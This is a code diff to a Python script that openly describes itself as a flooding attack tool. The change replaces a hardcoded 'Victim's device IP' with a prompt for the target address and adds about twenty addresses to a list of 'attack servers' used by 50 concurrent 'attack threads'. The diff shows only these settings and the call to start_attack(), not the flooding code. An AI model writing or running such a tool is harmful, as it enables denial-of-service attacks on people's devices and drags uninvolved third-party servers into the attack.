@@ -7,14 +7,23 @@ import speedtest
 import time
 
 # Global variables
-carrier_ips = ["27.61.154.148"]  # Victim's device IP
+# Prompt the user to input the carrier's IP address
+carrier_ips = [input("Please enter the carrier's IP address: ")]  # Victim's device IP
+
 # Expanded list of attack servers
 attack_servers = [
     "149.202.182.136", "185.54.175.156", "62.76.249.38", "192.168.1.1",
     "198.51.100.1", "203.0.113.1", "94.142.241.111", "195.54.160.149",
     "185.232.21.124", "103.145.12.34", "185.81.180.1", "31.13.71.36",
-    "52.58.78.16", "54.85.117.166", "8.8.4.4", "9.9.9.9"
+    "52.58.78.16", "54.85.117.166", "8.8.4.4", "9.9.9.9",
+    "45.32.250.123", "67.205.168.55", "198.199.89.33", "172.104.21.56",
+    "74.208.189.14", "104.154.198.67", "52.51.12.125", "185.229.122.83",
+    "93.184.216.34", "198.101.249.230", "104.19.233.201", "104.28.254.52",
+    "209.85.231.104", "192.124.249.17", "199.193.244.54", "45.55.32.5",
+    "185.220.100.254", "198.51.200.90", "45.77.245.109", "156.236.223.34"
 ]
+
+
 targets = ["8.8.8.8"]  # Google's public DNS, for testing
 threads = 50  # Number of attack threads for concurrent flooding
 
@@ -81,4 +90,4 @@ def start_attack():
 # Run the attack and handle errors gracefully
 if __name__ == "__main__":
     start_attack()
-    
+        
